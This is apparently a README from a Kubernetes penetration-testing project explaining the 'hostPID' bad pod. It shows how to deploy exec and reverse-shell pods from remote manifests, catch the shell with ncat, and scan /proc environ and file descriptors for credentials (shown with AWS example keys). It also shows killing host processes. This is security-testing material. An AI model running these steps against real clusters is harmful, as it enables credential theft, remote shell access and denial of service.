# Bad Pod #5: hostPID 
![](../../.github/images/Pod5.jpg)

There’s no clear path to get root on the node with only `hostPID`, but there are still some good post exploitation opportunities.  
*	**View processes on the host** – When you run ps from within a pod that has hostPID: true, you see all the processes running on the host, including processes running within each pod. 
*	**View the environment variables for each pod on the host** - With hostPID: true, you can read the /proc/[PID]/environ file for each process running on the host, including all processes running in pods. 
*	**View the file descriptors for each pod on the host** - With hostPID: true, you can read the /proc/[PID]/fd[X] for each process running on the host, including all of the processes running in pods. Some of these allow you to read files that are opened within pods. 
*	**Look for passwords, tokens, keys, etc.** – If you are lucky, you will find credentials and you’ll be able to use them to escalate privileges within the cluster, to escalate privileges services supported by the cluster, or to escalate privileges services that cluster-hosted applications are communicating with. It is a long shot, but you might find a Kubernetes service account token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster admin. 
*	**Kill processes** – You can also kill any process on the node (presenting a denial-of-service risk), but I would advise against it on a penetration test!

## Table of Contents
- [Bad Pod #5: hostPID](#bad-pod-5-hostpid)
  - [Table of Contents](#table-of-contents)
- [Pod creation & access](#pod-creation--access)
  - [Exec pods](#exec-pods)
  - [Reverse shell pods](#reverse-shell-pods)
  - [Deleting resources](#deleting-resources)
- [Post exploitation](#post-exploitation)
  - [View all processes running on the host and look for passwords, tokens, keys, etc.](#view-all-processes-running-on-the-host-and-look-for-passwords-tokens-keys-etc)
  - [View the environment variables for each pod on the host](#view-the-environment-variables-for-each-pod-on-the-host)
  - [View the file descriptors for each pod on the host](#view-the-file-descriptors-for-each-pod-on-the-host)
  - [Also, you can also kill any process, but don't do that in production :)](#also-you-can-also-kill-any-process-but-dont-do-that-in-production-)
  - [Attacks that apply to all pods, even without any special permissions](#attacks-that-apply-to-all-pods-even-without-any-special-permissions)
- [Demonstrate impact](#demonstrate-impact)
- [References and further reading:](#references-and-further-reading)

# Pod creation & access

## Exec pods
Create one or more of these resource types and exec into the pod

**Pod**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl exec -it hostpid-exec-pod -- bash
```
**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**

* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 

```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/[RESOURCE_TYPE]/hostpid-exec-[RESOURCE_TYPE].yaml 
kubectl get pods | grep hostpid-exec-[RESOURCE_TYPE]      
kubectl exec -it hostpid-exec-[RESOURCE_TYPE]-[ID] -- bash
```

*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 

To troubleshoot a case where you don't see pods, use `kubectl describe`

```
kubectl describe hostpid-exec-[RESOURCE_TYPE]
```

## Reverse shell pods
Create one or more of these resources and catch the reverse shell

**Step 1: Set up listener**
```bash
ncat --ssl -vlp 3116
```

**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**

* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
* Replace the HOST and PORT values to point the reverse shell to your listener
* 
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostpid/[RESOURCE_TYPE]/hostpid-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
```

**Step 3: Catch the shell**
```bash
$ ncat --ssl -vlp 3116
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: Listening on :::3116
Ncat: Listening on 0.0.0.0:3116
Connection received on 10.0.0.162 42035
```

## Deleting resources
You can delete a resource using it's manifest, or by name. Here are some examples: 
```
kubectl delete [type] [resource-name]
kubectl delete -f manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl delete pod hostpid-exec-pod
kubectl delete cronjob hostpid-exec-cronjob
```

# Post exploitation

## View all processes running on the host and look for passwords, tokens, keys, etc. 
```bash
ps -aux
...omitted for brevity...
root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c while true; do ./my-program --grafana-uername=admin --grafana-password=admin; sleep 10;done
...omitted for brevity...
```
Check out that clear text password in the ps output below! 

## View the environment variables for each pod on the host
This lists the environ file for each process, and then uses xargs to split it up so that each environment variable is on it's own line:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done > envs.txt
```
Now it's time to look for interesting environment variables. 
```bash
root@hostpid-exec-pod:/# less procs.txt
...omitted for brevity...

/proc/578808/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=envar-demo
NPM_CONFIG_LOGLEVEL=info
NODE_VERSION=4.4.2
DEMO_FAREWELL=Such a sweet sorrow
DEMO_GREETING=Hello from the environment
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
...omitted for brevity...
```
Oh look, an AWS IAM user key and secret! 

## View the file descriptors for each pod on the host
This lists out the file descriptors for each PID that we have access to.

```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
```

Now it's time to look for interesting files. Oh look, a vim swp file!
```bash
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
lrwx------ 1 root root 64 Jun 15 02:26 /proc/635975/fd/0 -> /dev/null
l-wx------ 1 root root 64 Jun 15 02:26 /proc/635975/fd/1 -> pipe:[65069205]
```

Let's see what's in `/.secret.txt.swp`. This file exists within a container, but we can access it by reading `/proc/635813/fd/4`!

```bash
cat /proc/635813/fd/4
3210#"! UtadBnnmAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLEAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEYI'm going to keep my secrets in this file!
```
More secrets!


## Also, you can also kill any process, but don't do that in production :)
```
pkill -f "nginx" 
```

## Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.

# References and further reading: 
